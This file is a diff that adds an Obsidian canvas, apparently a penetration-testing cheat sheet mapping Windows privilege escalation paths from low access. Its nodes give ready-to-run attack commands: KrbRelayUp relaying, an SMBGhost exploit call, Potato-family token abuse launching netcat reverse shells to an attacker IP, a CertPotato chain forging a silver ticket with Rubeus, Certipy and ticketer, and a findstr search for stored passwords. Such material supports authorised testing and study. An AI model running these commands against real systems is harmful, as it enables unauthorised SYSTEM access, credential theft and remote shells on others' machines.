@@ -1,0 +1,41 @@
+{
+	"nodes":[
+		{"id":"bcc7c56b8e9022c2","type":"group","x":-1680,"y":-1220,"width":3240,"height":3460,"color":"#7f7f7f","label":"GOT LOW ACCESS"},
+		{"id":"21c47324b8fddff7","type":"group","x":-2960,"y":130,"width":1080,"height":760,"label":"NO CREDENTIALS"},
+		{"id":"d70da1140a04b6da","type":"group","x":1920,"y":-320,"width":1080,"height":760,"color":"4","label":"GOT CREDENTIALS"},
+		{"id":"4b43d371f905e3d1","type":"group","x":1920,"y":640,"width":1080,"height":760,"color":"#e178e1","label":"GOT LOCAL ADMIN"},
+		{"id":"1b75f1e4485b6fb1","type":"file","file":"ATTACKS/GOT CREDENTIALS.canvas","x":2000,"y":-265,"width":920,"height":600,"color":"4"},
+		{"id":"5c005e15f8f6138f","type":"file","file":"ATTACKS/GOT LOCAL ADMIN ACCESS.canvas","x":2000,"y":726,"width":920,"height":600,"color":"#e178e1"},
+		{"id":"5ebec6480224dce8","type":"text","text":"# LOW ACCESS","x":-1600,"y":114,"width":293,"height":50,"color":"#48599d"},
+		{"id":"75fb2f7a3c5b4910","type":"text","text":"# Search Files with possible passwords in them\n\n```shell\n# Checking for the occirance of the string password in files\n🔵 findstr /si 'password' *.txt *.xml *.docx\n```","x":-901,"y":360,"width":1160,"height":150},
+		{"id":"c5fa513bec971928","type":"text","text":"# LOCAL ADMIN","x":340,"y":-345,"width":280,"height":50,"color":"#e179dd"},
+		{"id":"584dce2439eb73a3","type":"text","text":"# 🔥 KrRelayUp\n\n>[!info] Theory\n>- https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\n>- https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html\n\n>[!example] Tools\n>- [DecOne KrbRelayUp ](https://github.com/Dec0ne/KrbRelayUp)\n\n```shell\n# Using KrbrelayUp.exe\n\n 🔵 KrbRelayUp.exe relay -Domain '<domain>' -CreateNewComputerAccount -ComputerName '<computer$>' -ComputerPassword '<password>'\n 🔵 KrbRelayUp.exe spawn -m rbcd -d '<domain>' -dc '<dc>' -ComputerName '<computer$>' -ComputerPassword '<password>'\n```","x":-901,"y":-1140,"width":1160,"height":525},
+		{"id":"ea0fd94aed6c76aa","type":"text","text":"# 🚨 SmbGhost\n>[!warning] Do not use in production environment! build \n\n>[!info] Theory \n>- https://www.keysight.com/blogs/en/tech/nwvs/2022/02/11/smbghost-an-overview-of-cve-2020-0796\n\n>[!example] Tools\n> - [Barriuso SMBGhost Automated Exploitation ](https://github.com/Barriuso/SMBGhost_AutomateExploitation)\n```shell\n⚪ python3 smbghost.py -i '<dc_ip>' --check -e --lhost '<attacker_ip' --lport '<attacker_lport>' \n```","x":-900,"y":-562,"width":1160,"height":484},
+		{"id":"a19275dfb822c980","type":"text","text":"# CREDENTIALS FOUND","x":340,"y":410,"width":380,"height":50,"color":"4"},
+		{"id":"25af1c13754907bb","type":"text","text":"# 🔥 Auto Enumeration\n\n>[!example] Tools\n>- [Windows Privilege Escalation Awesome Scripts](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)\n>- [Itm4n Privesccheck](https://github.com/itm4n/PrivescCheck)\n\n```shell\n# RunWinpeas\n🔵 Winpeas.exe\n🔵 .\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended\"\n```\n","x":-900,"y":-28,"width":1160,"height":348},
+		{"id":"a70fc5d9195f26f3","type":"text","text":"# LOCAL ADMIN","x":340,"y":-902,"width":280,"height":50,"color":"#e179dd"},
+		{"id":"996b99056f4ff4c8","type":"text","text":"# LOCAL ADMIN","x":340,"y":121,"width":280,"height":50,"color":"#e179dd"},
+		{"id":"c01603e02724f060","type":"text","text":"# 🔥 Service Account with SEimpersonate privs\n>[!info] Theory \n>- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#seimpersonateprivilege\n\n>[!example] Tools\n> - [Itm4n Printspoofer](https://github.com/itm4n/PrintSpoofer)\n> - [AntonioCoco RoguePotato](https://github.com/antonioCoco/RoguePotato)\n> - [Bugch3ck sharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)\n> - [BeichenDream GodPotato](https://github.com/BeichenDream/GodPotato)\n> - [Zcgonvh EfsPotato](https://github.com/zcgonvh/EfsPotato)\n\n\n\n>[!warning] **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, **PrintSpoofer** **RoguePotato**,** SharpEfsPotato** leverage the same privileges and gain `NT AUTHORITY\\SYSTEM` level access.\n\n```shell\n# GodPotato\n🔵⚫ GodPotato -cmd \"nc -t -e C:\\Windows\\System32\\cmd.exe 'attacker_ip' 'lport' \"\n# PrintSpoofer\n🔵⚫ c:\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 'attacker_ip' 'lport' -e cmd\"\n# RoguePotato\n🔵⚫ c:\\RoguePotato.exe -r 10.10.10.10 -c \"c:\\tools\\nc.exe 'attacker_ip' 'lport' -e cmd\" -l 9999\n# In some old versions you need to use the \"-f\" param\n🔵⚫ c:\\RoguePotato.exe -r 10.10.10.10 -c \"c:\\tools\\nc.exe 'attacker_ip' 'lport' -e cmd\" -f 9999\n# SharpEfsPotato\n🔵⚫ SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a 'command'\n# EfsPotato\n🔵⚫ EfsPotato.exe \"whoami\"\n\n```","x":-901,"y":560,"width":1160,"height":860},
+		{"id":"1aab023a4790c7a4","type":"text","text":"# LOCAL ADMIN","x":340,"y":965,"width":280,"height":50,"color":"#e179dd"},
+		{"id":"b89ce6f933fc38af","type":"text","text":"# CertPotato\n>[!info] Theory \n>- https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/\n\n>[!example] Tools\n>- [Ghost Pack Rubeus](https://github.com/GhostPack/Rubeus)\n>- [Oliver lyak Certipy](https://github.com/ly4k/Certipy)\n>- [Impacket Ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)\n```shell\n# CertPotato\n🔵⚫ Rubeus.exe tgtdeleg /nowrap #(convert kirbi ticket to ccache to proceed with attack)\n# Request certificate with tgt obtained previously\n⚪ Certipy req -h -ca '<ca>' -template Machine -target '<dc>'\n# obtain machine account hash\n⚪ Certipy auth -pfx '<pfxfile>'\n# Shadow Credential\n⚪ Certipy shadow auto -u '<'machine$'@domain>' -k account '<machine$>'\n# Get our silver ticket\n⚪ ticketer.py -nthash '<hash>' -domain-sid '<domain_sid>' -domain '<domain>' -spn cifs/'<dc>' '<targetUser>'\n```","x":-160,"y":1480,"width":1197,"height":660},
+		{"id":"9097bf5d607e369b","type":"text","text":"# LOCAL ADMIN","x":1120,"y":1785,"width":280,"height":50,"color":"#e179dd"},
+		{"id":"4ef0c1300a02b81f","type":"file","file":"INTERACTIVE-MAP.canvas","x":-2880,"y":210,"width":920,"height":600}
+	],
+	"edges":[
+		{"id":"fd36811a2248b069","fromNode":"5ebec6480224dce8","fromSide":"right","toNode":"584dce2439eb73a3","toSide":"left"},
+		{"id":"e296b224d1afa361","fromNode":"5ebec6480224dce8","fromSide":"right","toNode":"ea0fd94aed6c76aa","toSide":"left"},
+		{"id":"ead6ba2e8e0d4605","fromNode":"c01603e02724f060","fromSide":"bottom","toNode":"b89ce6f933fc38af","toSide":"left"},
+		{"id":"5f84ccba600d1078","fromNode":"5ebec6480224dce8","fromSide":"right","toNode":"c01603e02724f060","toSide":"left"},
+		{"id":"401d0654e7541190","fromNode":"5ebec6480224dce8","fromSide":"right","toNode":"25af1c13754907bb","toSide":"left"},
+		{"id":"c81924ef2aa4a0dd","fromNode":"584dce2439eb73a3","fromSide":"right","toNode":"a70fc5d9195f26f3","toSide":"left"},
+		{"id":"1ebd5b640c08e769","fromNode":"ea0fd94aed6c76aa","fromSide":"right","toNode":"c5fa513bec971928","toSide":"left"},
+		{"id":"8c5c94722dd85bdb","fromNode":"25af1c13754907bb","fromSide":"right","toNode":"996b99056f4ff4c8","toSide":"left"},
+		{"id":"279a7927ad97fbc3","fromNode":"c01603e02724f060","fromSide":"right","toNode":"1aab023a4790c7a4","toSide":"left"},
+		{"id":"a2613d7684fa6ea9","fromNode":"b89ce6f933fc38af","fromSide":"right","toNode":"9097bf5d607e369b","toSide":"left"},
+		{"id":"68b8b347360826c1","fromNode":"21c47324b8fddff7","fromSide":"right","toNode":"bcc7c56b8e9022c2","toSide":"left"},
+		{"id":"bb10e77e610f48b4","fromNode":"75fb2f7a3c5b4910","fromSide":"right","toNode":"a19275dfb822c980","toSide":"left"},
+		{"id":"b55d1daf1c2841e3","fromNode":"bcc7c56b8e9022c2","fromSide":"right","toNode":"d70da1140a04b6da","toSide":"left","color":"4"},
+		{"id":"23b40a6401bab090","fromNode":"bcc7c56b8e9022c2","fromSide":"right","toNode":"4b43d371f905e3d1","toSide":"left","color":"#e178e1"},
+		{"id":"2651abf9a82410f6","fromNode":"5ebec6480224dce8","fromSide":"right","toNode":"75fb2f7a3c5b4910","toSide":"left"}
+	]
+}
